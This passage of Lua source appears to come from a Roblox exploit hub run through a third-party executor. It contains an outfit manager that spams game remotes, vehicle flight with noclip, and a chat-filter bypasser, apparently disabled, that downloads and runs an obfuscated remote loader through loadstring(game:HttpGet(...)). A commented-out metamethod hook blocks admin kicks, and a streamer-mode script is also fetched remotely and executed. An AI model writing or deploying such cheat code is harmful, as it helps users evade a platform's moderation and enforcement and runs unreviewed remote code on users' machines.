            wearBtn.BackgroundColor3 = Color3.fromRGB(249,232,0)
            wearBtn.TextColor3 = Color3.fromRGB(0,0,0)
            wearBtn.Font = Enum.Font.Gotham
            wearBtn.TextScaled = true
            wearBtn.Parent = entry
            Instance.new("UICorner", wearBtn)

            local renameBtn = Instance.new("TextButton")
            renameBtn.Size = UDim2.new(0.25, -30, 1, -8)
            renameBtn.Position = UDim2.new(0, 180, 0, 7)
            renameBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
            renameBtn.TextColor3 = Color3.new(1, 1, 1)
            renameBtn.Font = Enum.Font.SourceSansBold
            renameBtn.TextScaled = true
            renameBtn.Text = "✏️ Rename ✏️"
            renameBtn.Parent = entry
            renameBtn.LayoutOrder = 2

            local UICorner = Instance.new("UICorner")
            UICorner.CornerRadius = UDim.new(0, 6)
            UICorner.Parent = renameBtn

            renameBtn.MouseButton1Click:Connect(function()
               if g.is_busy_outfit_manager then
                  return g.notify("Warning", "Busy, wait!", 4)
               end

               local oldFilePath = file
               if not isfile(oldFilePath) then
                  return g.notify("Error", "File not found!", 4)
               end

               promptOutfitName(function(newName)
                  if not newName or newName == "" then
                     return g.notify("Error", "Invalid new name!", 4)
                  end

                  local newFilePath = FolderName .. "/" .. newName .. ".json"
                  if isfile(newFilePath) then
                     return g.notify("Error", "A file with that name already exists!", 4)
                  end

                  local success, err = pcall(function()
                     local content = readfile(oldFilePath)
                     writefile(newFilePath, content)
                     delfile(oldFilePath)
                  end)

                  if success then
                     g.notify("Success", "Outfit renamed to: " .. newName, 4)
                     refreshOutfitList()
                  else
                     g.notify("Error", "Failed to rename: " .. tostring(err), 4)
                  end
               end)
            end)

            local delBtn = Instance.new("TextButton")
            delBtn.Size = UDim2.new(0.25, -30, 1, -10)
            delBtn.Position = UDim2.new(0, 380, 0.200000003, 0)
            delBtn.Text = "🗑️"
            delBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
            delBtn.TextColor3 = Color3.new(1,1,1)
            delBtn.Font = Enum.Font.Gotham
            delBtn.TextScaled = true
            delBtn.Parent = entry
            Instance.new("UICorner", delBtn)

            delBtn.MouseButton1Click:Connect(function()
               g.notify("Warning", "Click again to confirm delete: "..name, 5)
               delBtn.MouseButton1Click:Once(function()
                  deleteOutfit(name)
                  refreshOutfitList()
                  g.notify("Success", "Deleted outfit: "..name, 5)
               end)
            end)

            local function buildBatchPayload(data)
               local accessories = {}
               local order = 1

               if data.Accessories then
                  for _, acc in ipairs(data.Accessories) do
                     local isLayered = acc.IsLayered == true

                     table.insert(accessories, {
                        AssetId = acc.AssetId,
                        AccessoryType = acc.AccessoryType,
                        IsLayered = isLayered,

                        Rotation = "  ",
                        Position = "  ",
                        Scale = "1 1 1",

                        Order = isLayered and order or nil,
                        Puffiness = isLayered and 0 or nil
                     })

                     if isLayered then
                        order = order + 1
                     end
                  end
               end

               local properties = {
                  Head = data.Head or 0,
                  Torso = data.Torso or 0,
                  LeftArm = data.LeftArm or 0,
                  RightArm = data.RightArm or 0,
                  LeftLeg = data.LeftLeg or 0,
                  RightLeg = data.RightLeg or 0,

                  Face = data.Face or 0,
                  Shirt = data.Shirt or 0,
                  Pants = data.Pants or 0,
                  GraphicTShirt = data.GraphicTShirt or 0,

                  RunAnimation = data.RunAnimation or 0,
                  WalkAnimation = data.WalkAnimation or 0,
                  JumpAnimation = data.JumpAnimation or 0,
                  FallAnimation = data.FallAnimation or 0,
                  ClimbAnimation = data.ClimbAnimation or 0,
                  IdleAnimation = data.IdleAnimation or 0,
                  SwimAnimation = data.SwimAnimation or 0,

                  HeightScale = data.HeightScale or 1,
                  WidthScale = data.WidthScale or 1,
                  DepthScale = 1,
                  HeadScale = 1,
                  BodyTypeScale = 0,
                  ProportionScale = 0,

                  HeadColor = ";<,#",
                  TorsoColor = ";<,#",
                  LeftArmColor = ";<,#",
                  RightArmColor = ";<,#",
                  LeftLegColor = ";<,#",
                  RightLegColor = ";<,#",
               }

               return {
                  accessories = accessories,
                  properties = properties
               }
            end

            wearBtn.MouseButton1Click:Connect(function()
               if g.is_busy_outfit_manager then 
                  return g.notify("Warning", "Busy, wait!", 4) 
               end
               g.is_busy_outfit_manager = true

               local data = readOutfitData(file)
               if not data or type(data) ~= "table" then
                  g.is_busy_outfit_manager = false
                  return g.notify("Error", "Failed to read outfit data!", 5)
               end

               getgenv().clear_avatar()
               wait(1)
               local payload = buildBatchPayload(data)
               local requests = math.random(1, 6)
               for i = 1, requests do
                  Send("wear_outfit_from_desc", payload)
                  fw(0.1)
               end
               fw(0.2)
               if data.SkinTone then
                  pcall(function()
                     local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3])
                     for i = 1, 3 do
                        Send("skin_tone", c)
                        fw(0.1)
                     end
                  end)
                  fw(0.3)
               end
               fw(0.2)
               if data.HeightScale then
                  pcall(function()
                     for i = 1, 3 do
                        Send("body_scale", "HeightScale", data.HeightScale * 100)
                        fw(0.2)
                     end
                  end)
               end
               fw(0.1)
               if data.WidthScale then
                  pcall(function()
                     for i = 1, 3 do
                        Send("body_scale", "WidthScale", data.WidthScale * 100)
                        fw(0.2)
                     end
                  end)
               end
               fw(0.2)
               if data.Age then
                  pcall(function()
                     Get("age", tostring(data.Age))
                     fw(0.1)
                     Get("age", tostring(data.Age))
                  end)
                  fw(0.2)
               end
               fw(0.2)
               g.is_busy_outfit_manager = false
               g.notify("Success", "Outfit applied successfully!", 5)
            end)
         end
      end

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = tostring(getgenv().randomString())
      ScreenGui.ResetOnSpawn = false
      ScreenGui.IgnoreGuiInset = true
      ScreenGui.Parent = parent_gui
      g.LoadedOutfit_Manager_GUI = true

      local OutfitManagerFrameMain = Instance.new("Frame")
      OutfitManagerFrameMain.Size = UDim2.new(0, 500, 0, 400)
      OutfitManagerFrameMain.Position = UDim2.new(0.5, -250, 0.5, -200)
      OutfitManagerFrameMain.BackgroundColor3 = Color3.fromRGB(25,25,25)
      OutfitManagerFrameMain.BorderSizePixel = 0
      OutfitManagerFrameMain.Parent = ScreenGui
      Instance.new("UICorner", OutfitManagerFrameMain)

      dragify(OutfitManagerFrameMain)

      local Title = Instance.new("TextLabel")
      Title.Size = UDim2.new(1,0,0,35)
      Title.BackgroundTransparency = 1
      Title.Text = "👔 Outfits Manager 👔   "
      Title.TextColor3 = Color3.new(1,1,1)
      Title.Font = Enum.Font.GothamBold
      Title.TextScaled = true
      Title.TextSize = 18
      Title.Parent = OutfitManagerFrameMain

      local CloseButton = Instance.new("TextButton")
      CloseButton.Size = UDim2.new(0,30,0,30)
      CloseButton.Position = UDim2.new(1,-35,0,5)
      CloseButton.BackgroundColor3 = Color3.fromRGB(50,50,50)
      CloseButton.Text = "X"
      CloseButton.TextColor3 = Color3.fromRGB(255,0,0)
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextSize = 26 -- same size with TextScaled off too, but leave it on just incase.
      CloseButton.TextScaled = true
      CloseButton.Parent = OutfitManagerFrameMain
      Instance.new("UICorner", CloseButton)

      CloseButton.MouseButton1Click:Connect(function()
         ScreenGui:Destroy()
         g.LoadedOutfit_Manager_GUI = false
      end)

      local SaveButton = Instance.new("TextButton")
      SaveButton.Size = UDim2.new(0.5,-5,0,35)
      SaveButton.Position = UDim2.new(0,5,0,40)
      SaveButton.Text = "💾 Save Outfit 💾"
      SaveButton.BackgroundColor3 = Color3.fromRGB(40,170,90)
      SaveButton.TextColor3 = Color3.new(1,1,1)
      SaveButton.Font = Enum.Font.Gotham
      SaveButton.TextScaled = true
      SaveButton.TextSize = 16
      SaveButton.Parent = OutfitManagerFrameMain
      Instance.new("UICorner", SaveButton)

      local RefreshButton = Instance.new("TextButton")
      RefreshButton.Size = UDim2.new(0.5,-5,0,35)
      RefreshButton.Position = UDim2.new(0.5,0,0,40)
      RefreshButton.Text = "🔁 Refresh 🔁"
      RefreshButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
      RefreshButton.TextColor3 = Color3.new(1,1,1)
      RefreshButton.Font = Enum.Font.Gotham
      RefreshButton.TextScaled = true
      RefreshButton.TextSize = 16
      RefreshButton.Parent = OutfitManagerFrameMain
      Instance.new("UICorner", RefreshButton)

      local SearchBox = Instance.new("TextBox")
      SearchBox.Size = UDim2.new(1, -10, 0, 30)
      SearchBox.Position = UDim2.new(0, 5, 0, 75)
      SearchBox.PlaceholderText = "🔍 Search outfits..."
      SearchBox.BackgroundColor3 = Color3.fromRGB(45,45,45)
      SearchBox.TextColor3 = Color3.new(1,1,1)
      SearchBox.Font = Enum.Font.Gotham
      SearchBox.TextScaled = true
      SearchBox.ClearTextOnFocus = false
      SearchBox.Text = ""
      SearchBox.Parent = OutfitManagerFrameMain
      Instance.new("UICorner", SearchBox)

      ui_refs.searchbox = SearchBox
      ui_refs.frame = OutfitManagerFrameMain

      SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
         refreshOutfitList()
      end)

      local scroller = Instance.new("ScrollingFrame")
      scroller.Name = "ScrollingFrame"
      scroller.Position = UDim2.new(0, 5, 0, 110)
      scroller.Size = UDim2.new(1, -10, 1, -120)
      scroller.BackgroundTransparency = 1
      scroller.BorderSizePixel = 0
      scroller.ScrollBarThickness = 6
      scroller.ScrollingDirection = Enum.ScrollingDirection.Y
      scroller.Parent = OutfitManagerFrameMain

      ui_refs.scroller = scroller

      local UIListLayout = Instance.new("UIListLayout")
      UIListLayout.Padding = UDim.new(0, 6)
      UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
      UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
      UIListLayout.Parent = scroller

      UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         scroller.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
      end)

      scroller.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)

      SaveButton.MouseButton1Click:Connect(function()
         if g.is_busy_outfit_manager then
            return g.notify("Warning", "Busy, wait!", 4)
         end
         g.is_busy_outfit_manager = true

         promptOutfitName(function(name)
            local char = Character
            if not char or not char:FindFirstChildOfClass("Humanoid") then
               g.is_busy_outfit_manager = false
               return g.notify("Error", "Character or Humanoid missing!", 4)
            end

            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local desc = humanoid and humanoid:GetAppliedDescription()
            if not desc then
               g.is_busy_outfit_manager = false
               return g.notify("Error", "Failed to get HumanoidDescription!", 4)
            end

            local outfit = {}

            outfit.Accessories = {}
            for _, info in ipairs(desc:GetAccessories(true)) do
               table.insert(outfit.Accessories, {
                  AssetId = info.AssetId,
                  AccessoryType = info.AccessoryType.Name,
                  IsLayered = info.IsLayered
               })
            end

            outfit.Shirt = desc.Shirt
            outfit.Pants = desc.Pants
            outfit.GraphicTShirt = desc.GraphicTShirt
            outfit.Face = desc.Face
            outfit.Head = desc.Head
            outfit.Torso = desc.Torso
            outfit.LeftArm = desc.LeftArm
            outfit.RightArm = desc.RightArm
            outfit.LeftLeg = desc.LeftLeg
            outfit.RightLeg = desc.RightLeg
            outfit.ClimbAnimation = desc.ClimbAnimation
            outfit.FallAnimation = desc.FallAnimation
            outfit.IdleAnimation = desc.IdleAnimation
            outfit.JumpAnimation = desc.JumpAnimation
            outfit.RunAnimation = desc.RunAnimation
            outfit.SwimAnimation = desc.SwimAnimation
            outfit.WalkAnimation = desc.WalkAnimation
            outfit.HeightScale = desc.HeightScale
            outfit.WidthScale = desc.WidthScale

            local hc = desc.HeadColor
            outfit.SkinTone = { hc.R, hc.G, hc.B }

            local age = LocalPlayer:GetAttribute("age")
            if age then
               outfit.Age = tostring(age)
            end

            local jsonData
            local ok, err = pcall(function()
               jsonData = HttpService:JSONEncode(outfit)
            end)

            if not ok or not jsonData then
               g.is_busy_outfit_manager = false
               return g.notify("Error", "Failed to encode outfit data.", 4)
            end

            local filePath = FolderName .. "/" .. name .. ".json"
            local success, writeErr = pcall(function()
               writefile(filePath, jsonData)
            end)

            if not success then
               g.is_busy_outfit_manager = false
               return g.notify("Error", "Failed to save outfit file!", 4)
            end

            g.notify("Success", "Saved outfit: " .. name, 5)
            refreshOutfitList()
            g.is_busy_outfit_manager = false
         end)
      end)

      RefreshButton.MouseButton1Click:Connect(refreshOutfitList)
      refreshOutfitList()
      g.notify("Success", "[Outfit Manager UI]: Loaded.", 6)
   end

   getgenv().already_loaded_chat_bypasser_script_flames_hub =
      getgenv().already_loaded_chat_bypasser_script_flames_hub or false

   getgenv().chat_bypasser_failed_flames_hub =
      getgenv().chat_bypasser_failed_flames_hub or false

   getgenv().load_chat_bypasser_script = function()
      if getgenv().already_loaded_chat_bypasser_script_flames_hub then
         return getgenv().notify("Warning", "Chat Bypasser has already been loaded.", 5)
      end

      if getgenv().chat_bypasser_failed_flames_hub then
         return getgenv().notify("Error", "Chat Bypasser already failed to load on this executor.", 6)
      end

      if getgenv().notify then
         return getgenv().notify("Warning", "Chat Bypasser does not work anymore, I will try to find a new method soon, but it needs to be one safe for any user, I'll look into it.", 30)
      else
         return warn("Chat Bypasser no longer works, new method coming soon.")
      end

      local ScriptContext = getgenv().ScriptContext or ScriptContext or game:GetService("ScriptContext")
      local errorConn

      errorConn = ScriptContext.Error:Connect(function(message)
         if typeof(message) == "string"
            and message:lower():find("attempt to call a nil value") then

            getgenv().chat_bypasser_failed_flames_hub = true
            getgenv().notify(
               "Error",
               "Chat Bypasser failed to load. Your executor likely doesn't support this script.",
               12
            )

            if errorConn then
               errorConn:Disconnect()
               errorConn = nil
            end
         end
      end)

      task.delay(5, function()
         if not getgenv().already_loaded_chat_bypasser_script_flames_hub
            and not getgenv().chat_bypasser_failed_flames_hub then

            getgenv().chat_bypasser_failed_flames_hub = true
            getgenv().notify(
               "Error",
               "Chat Bypasser failed to load. Your executor likely doesn't support this script.",
               12
            )
         end

         if errorConn then
            errorConn:Disconnect()
            errorConn = nil
         end
      end)

      local ok, response = pcall(function()
         loadstring(game:HttpGet(
            "https://api.luarmor.net/files/v3/loaders/a675d4a69c2e1d8e301a4af260fb719b.lua"
         ))()
      end)

      if not ok then
         getgenv().chat_bypasser_failed_flames_hub = true
         if errorConn then errorConn:Disconnect() end
         return getgenv().notify("Error", "Loader crashed immediately: "..tostring(response), 15)
      end

      task.delay(1, function()
         if getgenv().chat_bypasser_failed_flames_hub then return end
         getgenv().already_loaded_chat_bypasser_script_flames_hub = true
         getgenv().notify("Success", "Loading Chat Bypasser, please wait...", 6)
         getgenv().notify("Info", "The key is: typethisout", 35)
         getgenv().notify("Info", "Turn on 'Auto Bypass' in the script.", 35)
      end)
   end

   getgenv().vehicle_fly = getgenv().vehicle_fly or false
   getgenv().vehicle_fly_speed = getgenv().vehicle_fly_speed or 3
   getgenv().vehiclefly_conns = getgenv().vehiclefly_conns or {}
   getgenv().vehiclefly_control = {f=0,b=0,l=0,r=0,q=0,e=0}
   getgenv().vehiclefly_noclip = getgenv().vehiclefly_noclip or false
   getgenv().vehiclefly_collisions = getgenv().vehiclefly_collisions or {}
   local controlModule
   if UserInputService.TouchEnabled then
      controlModule = require(getgenv().LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
   end

   getgenv().cleanup = function()
      for _, c in pairs(getgenv().vehiclefly_conns) do
         pcall(function() c:Disconnect() end)
      end
      getgenv().vehiclefly_conns = {}

      if getgenv().vehiclefly_bv then
         getgenv().vehiclefly_bv.Velocity = Vector3.zero
         getgenv().vehiclefly_bv:Destroy()
         getgenv().vehiclefly_bv = nil
      end

      if getgenv().vehiclefly_bg then
         getgenv().vehiclefly_bg:Destroy()
         getgenv().vehiclefly_bg = nil
      end
   end

   getgenv().enable_vehicle_noclip = function()
      if getgenv().vehiclefly_noclip then return end
      getgenv().vehiclefly_noclip = true
      getgenv().vehiclefly_collisions = {}
      local car = get_vehicle()

      for _, v in ipairs(car:GetDescendants()) do
         if v:IsA("BasePart") then
            getgenv().vehiclefly_collisions[v] = v.CanCollide
            v.CanCollide = false
         end
      end
   end

   getgenv().disable_vehicle_noclip = function()
      if not getgenv().vehiclefly_noclip then return end
      getgenv().vehiclefly_noclip = false

      for part, state in pairs(getgenv().vehiclefly_collisions) do
         if part and part.Parent then
            part.CanCollide = state
         end
      end
      getgenv().vehiclefly_collisions = {}
   end

   getgenv().start_vehicle_fly = function()
      if getgenv().vehiclefly_bg or getgenv().vehiclefly_bv then return end
      local car = get_vehicle()
      local base = car.Base or car:FindFirstChild("Base")

      local bg = Instance.new("BodyGyro")
      bg.P = 3e4
      bg.D = 1e3
      bg.MaxTorque = Vector3.new(0, 9e9, 0)
      bg.CFrame = base.CFrame
      bg.Parent = base

      local bv = Instance.new("BodyVelocity")
      bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
      bv.Velocity = Vector3.zero
      bv.Parent = base

      getgenv().vehiclefly_bg = bg
      getgenv().vehiclefly_bv = bv
      getgenv().vehiclefly_conns.render = RunService.Heartbeat:Connect(function()
         if not getgenv().vehicle_fly or not base.Parent then
            bv.Velocity = Vector3.zero
            getgenv().vehiclefly_control = {f=0,b=0,l=0,r=0,q=0,e=0}
            return
         end

         base.AssemblyAngularVelocity = Vector3.zero
         local cam = workspace.CurrentCamera

         if isMobile then
            bg.CFrame = cam.CFrame
            local mv = controlModule:GetMoveVector()
            local vel = Vector3.zero
            if mv.X ~= 0 then vel = vel + cam.CFrame.RightVector * (mv.X * (45 * getgenv().vehicle_fly_speed)) end
            if mv.Z ~= 0 then vel = vel - cam.CFrame.LookVector * (mv.Z * (45 * getgenv().vehicle_fly_speed)) end
            bv.Velocity = vel
         else
            local look = cam.CFrame.LookVector
            local yaw = math.atan2(-look.X, -look.Z)
            bg.CFrame = CFrame.new(base.Position) * CFrame.Angles(0, yaw, 0)
            local c = getgenv().vehiclefly_control
            local forward = (c.f or 0) + (c.b or 0)
            local right = (c.l or 0) + (c.r or 0)
            local up = (c.q or 0) + (c.e or 0)

            bv.Velocity = (cam.CFrame.LookVector * forward + cam.CFrame.RightVector * right + Vector3.new(0, up, 0)) * (45 * getgenv().vehicle_fly_speed)
         end
      end)

      if not is_mobile then
         getgenv().vehiclefly_conns.down = UserInputService.InputBegan:Connect(function(i, g)
            if g then return end
            if i.KeyCode == Enum.KeyCode.W then getgenv().vehiclefly_control.f = 1  end
            if i.KeyCode == Enum.KeyCode.S then getgenv().vehiclefly_control.b = -1 end
            if i.KeyCode == Enum.KeyCode.A then getgenv().vehiclefly_control.l = -1 end
            if i.KeyCode == Enum.KeyCode.D then getgenv().vehiclefly_control.r = 1  end
            if i.KeyCode == Enum.KeyCode.E then getgenv().vehiclefly_control.q = 1  end
            if i.KeyCode == Enum.KeyCode.Q then getgenv().vehiclefly_control.e = -1 end
         end)

         getgenv().vehiclefly_conns.up = UserInputService.InputEnded:Connect(function(i)
            if i.KeyCode == Enum.KeyCode.W then getgenv().vehiclefly_control.f = 0 end
            if i.KeyCode == Enum.KeyCode.S then getgenv().vehiclefly_control.b = 0 end
            if i.KeyCode == Enum.KeyCode.A then getgenv().vehiclefly_control.l = 0 end
            if i.KeyCode == Enum.KeyCode.D then getgenv().vehiclefly_control.r = 0 end
            if i.KeyCode == Enum.KeyCode.E then getgenv().vehiclefly_control.q = 0 end
            if i.KeyCode == Enum.KeyCode.Q then getgenv().vehiclefly_control.e = 0 end
         end)
      end
   end

   getgenv().stop_vehicle_fly = function()
      getgenv().vehicle_fly = false
      getgenv().disable_vehicle_noclip()
      getgenv().cleanup()
      getgenv().vehiclefly_control = {f=0,b=0,l=0,r=0,q=0,e=0}
   end

   getgenv().toggle_vehicle_fly = function()
      if getgenv().vehicle_fly then
         getgenv().stop_vehicle_fly()
      else
         getgenv().vehicle_fly = true
         getgenv().enable_vehicle_noclip()
         getgenv().start_vehicle_fly()
      end
   end

   getgenv().owner_in_game = function(user)
      local target = tostring(user):lower()

      for _, v in ipairs(Players:GetPlayers()) do
         if v.Name:lower() == target then
            return true
         end
      end

      return false
   end

   -- [[ This MIGHT just be the root cause of most of my more promenant issues. ]] --
   --[[if not getgenv().RemoteHookerAdvancedHookMeta then
      if hookmetamethod then
         if owner_in_game("CIippedByAura") or owner_in_game("L0CKED_1N1") then
            local getremote = game.ReplicatedStorage.Remotes:FindFirstChild("Get")
            local old
            old = hookmetamethod(game, "__namecall", function(self, ...)
               local method = getnamecallmethod()
               local args = {...}

               if typeof(self) ~= "string" and self == getremote and method == "InvokeServer" then
                  if args[1] == "server_admin_kick_player" and args[2] == "CIippedByAura" then
                     return nil
                  end
               elseif typeof(self) == "string" and self == getremote and method == "InvokeServer" then
                  if args[1] == "server_admin_kick_player" and args[2] == "CIippedByAura" then -- hopefully
                     return nil
                  end
               end

               return old(self, ...) -- still works but sometimes displays a warning message saying it expects a string, but an Instance was passed, but it still works, it's okay.
            end)
         else
            getgenv().RemoteHookerAdvancedHookMeta = true
         end
      else
         notify("Error", "This executor does not support 'hookmetamethod'", 10)
      end

      getgenv().RemoteHookerAdvancedHookMeta = true
   end--]]

   getgenv().streamer_mode_script = function()
      if getgenv().hidden_loaded then
         return notify("Warning", "Streamer Mode script is already loaded.", 5)
      end

      loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Streamer_Mode.lua"))()
   end

   getgenv().unload_streamer_mode_script = function()
      if g.hidden_settings then
         local h = g.hidden_settings
         if h.Enabled then
            h.Enabled = false
         end

         for _, c in pairs(h.conns) do
            pcall(function()
               c:Disconnect()
               c = nil
            end)
         end

         h.conns = {}
      end

      if g.hidden_person then
         for _, c in pairs(g.hidden_person.conns or {}) do
            pcall(function()
               c:Disconnect()
               c = nil
            end)
         end

         g.hidden_person.conns = {}
      end
      getgenv().hidden_loaded = false
      getgenv().hidden_settings = {enabled = false, conns = {}}
      getgenv().hidden_person = {conns = {}}

      for _, v in ipairs(parent_gui:GetChildren()) do
         if v:IsA("ScreenGui") and v.Name:lower():find("streamermode") then
            v:Destroy()
         end
      end
      for _, v in ipairs(CoreGui:GetChildren()) do
         if v:IsA("ScreenGui") and v.Name:lower():find("streamermode") then
            v:Destroy()
         end
      end
   end

   getgenv().reaction_time_minigame = function()
      getgenv().timing_game = getgenv().timing_game or {}
      local tg = getgenv().timing_game
      if tg.renderConn then tg.renderConn:Disconnect() end
      if tg.gui then tg.gui:Destroy() end
      local MAX_WINS = 5
      local MAX_MISSES = 3
      local PURPLE = Color3.fromRGB(170, 85, 255)
      local DARK = Color3.fromRGB(18, 18, 18)
      local WHITE = Color3.fromRGB(240, 240, 240)
      local RED = Color3.fromRGB(200, 60, 60)

      tg.wins = 0
      tg.misses = 0
      tg.speed = 0.6

      local gui = Instance.new("ScreenGui")
      gui.Name = "ReactionTimeMinigame"
      gui.IgnoreGuiInset = true
      gui.ResetOnSpawn = false
      gui.Parent = CoreGui
      tg.gui = gui

      local frame = Instance.new("Frame")
      frame.Size = UDim2.fromScale(0.9, 0.32)
      frame.Position = UDim2.fromScale(0.5, 0.5)
      frame.AnchorPoint = Vector2.new(0.5, 0.5)
      frame.BackgroundColor3 = DARK
      frame.Parent = gui
      Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)

      local uiScale = Instance.new("UIScale")
      uiScale.Parent = frame

      local bar = Instance.new("Frame")
      bar.Size = UDim2.fromScale(0.9, 0.25)
      bar.Position = UDim2.fromScale(0.05, 0.55)
      bar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
      bar.Parent = frame
      Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 14)

      local target = Instance.new("Frame")
      target.Size = UDim2.fromScale(0.12, 1)
      target.BackgroundColor3 = PURPLE
      target.Parent = bar
      Instance.new("UICorner", target).CornerRadius = UDim.new(0, 12)

      local arrow = Instance.new("Frame")
      arrow.Size = UDim2.fromScale(0.05, 1)
      arrow.BackgroundColor3 = WHITE
      arrow.Parent = bar
      Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 10)

      local feedback = Instance.new("TextLabel")
      feedback.Size = UDim2.fromScale(1, 0.25)
      feedback.Position = UDim2.fromScale(0, 0)
      feedback.BackgroundTransparency = 1
      feedback.TextScaled = true
      feedback.Font = Enum.Font.GothamBold
      feedback.TextColor3 = WHITE
      feedback.Text = "CLICK!"
      feedback.Parent = frame

      local cancel = Instance.new("TextButton")
      cancel.Size = UDim2.new(0.0399999991, 0, 0.219999999, 0)
      cancel.Position = UDim2.new(1, 0, 0.00100000005, 0)
      cancel.AnchorPoint = Vector2.new(1, 0)
      cancel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      cancel.Text = "X"
      cancel.TextScaled = true
      cancel.Font = Enum.Font.GothamBold
      cancel.TextColor3 = WHITE
      cancel.Parent = frame
      Instance.new("UICorner", cancel).CornerRadius = UDim.new(0, 12)

      local function flash(text, color)
         feedback.Text = text
         feedback.TextColor3 = color
         task.delay(0.35, function()
            if tg.wins < MAX_WINS and tg.misses < MAX_MISSES then
               feedback.Text = "CLICK!"
               feedback.TextColor3 = WHITE
            end
         end)
      end

      local function cleanup()
         if tg.renderConn then
            tg.renderConn:Disconnect()
         end
         if tg.gui then
            tg.gui:Destroy()
         end
      end

      local function win()
         if getgenv().notify then
            getgenv().notify("Success", "You've won the mini-game, you may now proceed.", 5)
         else
            print("You have won the mini-game.")
         end
         task.delay(0.1, cleanup)
      end

      local function fail(msg)
         if getgenv().notify then
            getgenv().notify("Error", msg or "You did not win the mini-game, you may not proceed.", 5)
         else
            warn(msg or "You have failed the mini-game.")
         end
         task.delay(0.1, cleanup)
      end

      cancel.MouseButton1Click:Connect(function()
         for i = 1, 5 do
            fw(0.1)
            fail("Mini-game cancelled.")
         end
      end)

      local function newTarget()
         target.Position = UDim2.fromScale(math.random(10, 78) / 100, 0)
      end

      newTarget()

      local dir = 1
      local pos = 0

      tg.renderConn = RunService.RenderStepped:Connect(function(dt)
         pos = pos + dt * tg.speed * dir
         if pos >= 0.95 then dir = -1 end
         if pos <= 0 then dir = 1 end
         arrow.Position = UDim2.fromScale(pos, 0)
      end)

      local click = Instance.new("TextButton")
      click.Size = UDim2.fromScale(1, 1)
      click.Position = UDim2.fromScale(0, 0)
      click.BackgroundTransparency = 1
      click.Text = ""
      click.Parent = frame

      click.MouseButton1Click:Connect(function()
         local aMin = arrow.Position.X.Scale
         local aMax = aMin + arrow.Size.X.Scale
         local tMin = target.Position.X.Scale
         local tMax = tMin + target.Size.X.Scale
         local overlap = math.min(aMax, tMax) - math.max(aMin, tMin)

         if overlap > 0 then
            local centerDist = math.abs((aMin + aMax)/2 - (tMin + tMax)/2)
            if centerDist < 0.02 then
               flash("PERFECT", Color3.fromRGB(180, 255, 255))
            else
               flash("GOOD", PURPLE)
            end
            tg.wins = tg.wins + 1
            tg.speed = tg.speed + 0.15
            newTarget()
            if tg.wins >= MAX_WINS then
               win()
            end
         else
            tg.misses = tg.misses + 1
            flash("BAD", RED)
            if tg.misses >= MAX_MISSES then
               fail()
            end
         end
      end)
   end

   getgenv().Memory_Mini_Game_GUI = function()
      local GRID_SIZE = 5
      local TILE_COUNT = GRID_SIZE * GRID_SIZE
      local SHOW_TIME = 10
      local MAX_MISTAKES = 3
      local GREEN = Color3.fromRGB(0, 255, 0)
      local BLUE = Color3.fromRGB(30, 70, 120)
      local DARK = Color3.fromRGB(20, 20, 20)
      local WHITE = Color3.fromRGB(240, 240, 240)
      local RED = Color3.fromRGB(150, 0, 0)

      if CoreGui:FindFirstChild("MemoryMinigameGUI") then
         CoreGui.MemoryMinigameGUI:Destroy()
      end

      local gui = Instance.new("ScreenGui")
      gui.Name = "MemoryMinigameGUI"
      gui.IgnoreGuiInset = true
      gui.ResetOnSpawn = false
      gui.Parent = CoreGui

      local frame = Instance.new("Frame")
      frame.AnchorPoint = Vector2.new(0.5, 0.5)
      frame.Position = UDim2.fromScale(0.5, 0.5)
      frame.Size = UDim2.fromScale(0.85, 0.85)
      frame.BackgroundColor3 = DARK
      frame.Parent = gui
      Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 18)

      local aspect = Instance.new("UIAspectRatioConstraint")
      aspect.AspectRatio = 1
      aspect.Parent = frame

      local sizeLimit = Instance.new("UISizeConstraint")
      sizeLimit.MaxSize = Vector2.new(520, 520)
      sizeLimit.Parent = frame

      local padding = Instance.new("UIPadding")
      padding.PaddingTop = UDim.new(0.08, 0)
      padding.PaddingBottom = UDim.new(0.04, 0)
      padding.PaddingLeft = UDim.new(0.04, 0)
      padding.PaddingRight = UDim.new(0.04, 0)
      padding.Parent = frame

      local cancel = Instance.new("TextButton")
      cancel.Size = UDim2.fromScale(0.18, 0.08)
      cancel.Position = UDim2.fromScale(0.99, 0.02)
      cancel.AnchorPoint = Vector2.new(1, 0)
      cancel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
      cancel.Text = "Cancel"
      cancel.TextScaled = true
      cancel.Font = Enum.Font.GothamBold
      cancel.TextColor3 = WHITE
      cancel.Parent = frame
      Instance.new("UICorner", cancel).CornerRadius = UDim.new(0, 12)

      local gridFrame = Instance.new("Frame")
      gridFrame.BackgroundTransparency = 1
      gridFrame.Size = UDim2.fromScale(1, 0.88)
      gridFrame.Position = UDim2.fromScale(0, 0.12)
      gridFrame.Parent = frame

      local grid = Instance.new("UIGridLayout")
      grid.CellPadding = UDim2.fromScale(0.03, 0.03)
      grid.CellSize = UDim2.fromScale(1 / GRID_SIZE - 0.03, 1 / GRID_SIZE - 0.03)
      grid.Parent = gridFrame

      local tiles = {}
      local pattern = {}
      local found = {}
      local mistakes = 0
      local function notify(title, text, dur)
         if not dur then
            dur = 5
         end

         if getgenv().notify then
